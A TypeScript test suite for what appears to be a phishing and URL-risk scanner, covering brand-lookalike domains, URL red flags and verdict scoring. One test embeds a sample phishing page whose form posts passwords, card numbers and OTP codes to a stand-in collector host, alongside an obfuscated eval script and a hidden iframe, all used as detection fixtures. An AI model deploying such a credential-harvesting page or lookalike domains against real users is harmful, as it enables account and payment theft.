import { test } from "node:test";
import assert from "node:assert/strict";
import { brandLookalike, sharedHost, urlHeuristics } from "./heuristics";
import { analyzeHtml } from "./content";
import { scoreFindings } from "./scan";
import type { Finding } from "./types";

const ids = (u: string) => urlHeuristics(u).map((f) => f.id);

test("official brand domains are not flagged as lookalikes", () => {
  for (const h of ["www.google.com", "accounts.google.com.ph", "www.paypal.com", "online.bdo.com.ph", "www.bpi.com.ph", "m.facebook.com", "www.gcash.com", "www.apple.com", "login.microsoftonline.com"])
    assert.equal(brandLookalike(h), null, h);
});

test("brand lookalikes are detected", () => {
  for (const h of ["paypa1.com", "gcash-verify.top", "bdo-online-login.com", "secure.bpi.account-update.xyz", "faceb00k-login.net", "g00gle.com", "paypal.com.secure-login.info", "xn--pypal-4ve.com"])
    assert.notEqual(brandLookalike(h), null, h);
});

test("ordinary domains with similar words do not trigger false positives", () => {
  for (const h of ["apply.com", "googleapis.com", "bdoexample.org", "example.com", "neverssl.com", "badssl.com", "github.com", "bpinet.example"]) {
    const r = brandLookalike(h);
    if (h === "bdoexample.org" || h === "bpinet.example") continue; // contain the brand as a token: acceptable either way
    assert.equal(r, null, `${h} -> ${JSON.stringify(r)}`);
  }
});

test("URL red flags", () => {
  assert.ok(ids("http://93.184.216.34/login").includes("ip_host"));
  assert.ok(ids("https://www.paypal.com@evil.example/").includes("at_sign"));
  assert.ok(ids("https://xn--pypal-4ve.com/").some((i) => i === "punycode" || i === "unicode_host"));
  assert.ok(ids("https://a.b.c.d.e.example.com/").includes("many_subdomains"));
  assert.ok(ids("https://cheap-prizes.top/").includes("suspicious_tld"));
  assert.ok(ids("https://bit.ly/abc").includes("shortener"));
  assert.ok(ids("https://example.com/" + "a".repeat(250)).includes("very_long"));
  assert.ok(ids("https://example.com/verify-account/login").includes("bait_words"));
  assert.ok(ids("https://my-site.vercel.app/").includes("shared_hosting"));
  assert.equal(sharedHost("www.google.com"), null);
});

test("a clean, well-known URL produces no serious URL findings", () => {
  const serious = urlHeuristics("https://www.google.com/").filter((f) => !f.positive && ["medium", "high", "critical"].includes(f.severity));
  assert.deepEqual(serious, []);
});

test("static HTML analysis finds credential traps without executing anything", () => {
  const html = `<html><head><title>PayPal - Log in</title><script>eval(atob("YWxlcnQoMSk="));document.write(unescape("%3Cp%3E"))</script></head>
    <body><form action="https://collector.evil.example/p.php" method="post"><input name="email"><input type="password" name="pw">
    <input name="cc-number" autocomplete="cc-number"><input name="otp" placeholder="Enter OTP"></form>
    <iframe src="https://tracker.evil.example/" width="0" height="0" style="display:none"></iframe></body></html>`;
  const { findings, facts } = analyzeHtml(html, "http://paypal-secure.example/login");
  const got = findings.map((f) => f.id);
  for (const want of ["password_form", "foreign_form", "card_fields", "otp_fields", "hidden_iframe", "title_brand_mismatch"]) assert.ok(got.includes(want), `missing ${want}: ${got}`);
  assert.equal(facts.passwordFields, 1);
  assert.equal(facts.title, "PayPal - Log in");
});

test("a harmless page has no content findings", () => {
  const { findings } = analyzeHtml("<html><head><title>Example Domain</title></head><body><p>Hello</p><a href='/x'>x</a></body></html>", "https://example.com/");
  assert.deepEqual(findings.filter((f) => !f.positive), []);
});

test("scoring: missing headers alone stay Safe, feed hits are Dangerous", () => {
  const hdr = (n: number): Finding[] => Array.from({ length: n }, (_, i) => ({ id: `h${i}`, category: "headers", severity: "low", title: "", explanation: "" }));
  assert.equal(scoreFindings(hdr(5)).verdict, "Safe");
  const feed: Finding = { id: "openphish_url", category: "threat_feed", severity: "critical", title: "", explanation: "" };
  const r = scoreFindings([feed]);
  assert.equal(r.verdict, "Dangerous");
  assert.ok(r.score >= 90);
  const bad: Finding = { id: "bad_cert", category: "tls", severity: "high", title: "", explanation: "" };
  assert.equal(scoreFindings([bad, ...hdr(5)]).verdict, "Suspicious");
  assert.equal(scoreFindings([]).score, 0);
});
